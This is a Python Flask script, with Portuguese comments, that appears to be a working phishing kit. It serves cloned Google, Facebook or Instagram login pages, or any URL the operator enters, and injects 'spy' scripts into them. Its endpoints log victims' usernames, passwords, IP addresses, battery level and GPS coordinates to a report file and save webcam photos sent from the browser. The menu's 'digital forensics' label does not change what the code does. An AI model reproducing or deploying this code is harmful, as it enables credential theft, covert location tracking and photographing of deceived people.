from flask import Flask, render_template_string, request, jsonify
import datetime, base64, os, requests, shutil
import pytz

# --- CONFIGURAÇÃO DO FUSO HORÁRIO DE BRASÍLIA ---
fuso_br = pytz.timezone('America/Sao_Paulo')

# --- CONFIGURAÇÃO DOS CAMINHOS ---
if os.path.exists("/sdcard"):
    pasta_raiz = "/sdcard/info_spy"
else:
    pasta_raiz = os.path.join(os.getcwd(), "info_spy")

pasta_templates = "templates"

if not os.path.exists(pasta_raiz): os.makedirs(pasta_raiz)
if not os.path.exists(pasta_templates): os.makedirs(pasta_templates)

# --- FUNÇÃO PARA LISTAR TEMAS DISPONÍVEIS ---
def obter_temas():
    temas = {"1": "google", "2": "facebook", "3": "facebook_pc", "4": "instagram"}
    if os.path.exists(pasta_templates):
        extras = [d for d in os.listdir(pasta_templates) if os.path.isdir(os.path.join(pasta_templates, d))]
        idx = 6 
        for pasta in extras:
            if pasta not in temas.values():
                temas[str(idx)] = pasta
                idx += 1
    return temas

# --- MENU DE SELEÇÃO ATUALIZADO ---
def mostrar_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    temas_disponiveis = obter_temas()
    
    print("="*40)
    print(" PERÍCIA DIGITAL - SELECIONE O TEMA")
    print("="*40)
    
    for i in range(1, 5):
        print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
    
    print(" [5] Custom (URL - Clonar agora)")
    
    for k, v in temas_disponiveis.items():
        if int(k) >= 6:
            print(f" [{k}] {v} (Salvo)")
    
    print("="*40)

    opcao = input(" Escolha o template: ")
    
    url_custom = ""
    if opcao == "5":
        url_custom = input(" Digite a URL para clonar: ")
        if not url_custom.startswith("http"): url_custom = "https://" + url_custom
        
        salvar = input(" Deseja salvar este clone permanentemente? (s/n): ").lower()
        if salvar == 's':
            nome_pasta = input(" Digite o nome para a nova pasta (sem espaços): ").replace(" ", "_")
            caminho_novo = os.path.join(pasta_templates, nome_pasta)
            if not os.path.exists(caminho_novo): os.makedirs(caminho_novo)
            
            try:
                res = requests.get(url_custom, verify=False, timeout=10)
                with open(os.path.join(caminho_novo, "index.html"), "w", encoding="utf-8") as f:
                    f.write(res.text)
                print(f"[!] Site salvo com sucesso em templates/{nome_pasta}")
                return nome_pasta, input(" URL de redirecionamento: "), url_custom
            except Exception as e:
                print(f"Erro ao salvar: {e}")

    link_destino = input(" Digite a URL para redirecionar: ")
    if not link_destino.startswith("http"):
        link_destino = "https://" + link_destino
    
    if opcao == "5":
        tema_escolhido = "custom"
    else:
        tema_escolhido = temas_disponiveis.get(opcao, "google")
        
    return tema_escolhido, link_destino, url_custom

pasta_tema, url_redirecionamento, url_alvo_custom = mostrar_menu()

app = Flask(__name__)

@app.route('/')
def index():
    if pasta_tema == "custom":
        try:
            res = requests.get(url_alvo_custom, verify=False, timeout=10)
            html_original = res.text
        except Exception as e:
            return f"Erro ao clonar site: {e}", 500
    else:
        path = os.path.join(pasta_templates, pasta_tema, "index.html")
        if not os.path.exists(path):
            return f"Erro: Arquivo {path} nao encontrado!", 404
        with open(path, "r", encoding="utf-8") as f:
            html_original = f.read()
    
    script_config = (
        f'<script>'
        f'window.temaAtual = "{pasta_tema}"; '
        f'window.urlRedirecionamento = "{url_redirecionamento}";'
        f'</script>'
    )
    
    scripts_captura = (
        '\n<script src="/static/js/espiao.js"></script>'
        '\n<script src="/static/js/saida.js"></script>\n'
    )
    
    html_final = html_original.replace('<head>', '<head>' + script_config + scripts_captura)
    return render_template_string(html_final)

@app.route('/capturar', methods=['POST'])
def capturar():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    ip_publico = ip_list[0] if ip_list else request.remote_addr
    
    # --- NOVO DADO CAPTURADO: IP INTERNO ---
    ip_interno = dados.get('ip_interno', 'N/A')
    
    # --- DATA AJUSTADA PARA PADRÃO BR (DD/MM/AAAA) ---
    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
    
    log = (f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
           f"IP INTERNO (LAN): {ip_interno}\n"
           f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
           f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
           f"LAT: {dados.get('lat')} | LON: {dados.get('lon')}\n"
           f"{'-'*50}\n")
    
    caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho_relatorio, "a") as f:
        f.write(log)
    print(f"[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})")
    return jsonify({"status": "ok"}), 200

@app.route('/foto', methods=['POST'])
def foto():
    try:
        dados = request.json
        img_str = dados['image'].split(",")[1]
        img_data = base64.b64decode(img_str)
        # --- NOME DA FOTO AJUSTADO ---
        hora_atual = datetime.datetime.now(fuso_br).strftime('%d-%m-%Y_%H%M%S')
        nome_foto = f"foto_{hora_atual}.jpg"
        caminho_foto = os.path.join(pasta_raiz, nome_foto)
        with open(caminho_foto, "wb") as f:
            f.write(img_data)
        return "OK", 200
    except Exception as e:
        return "Erro", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
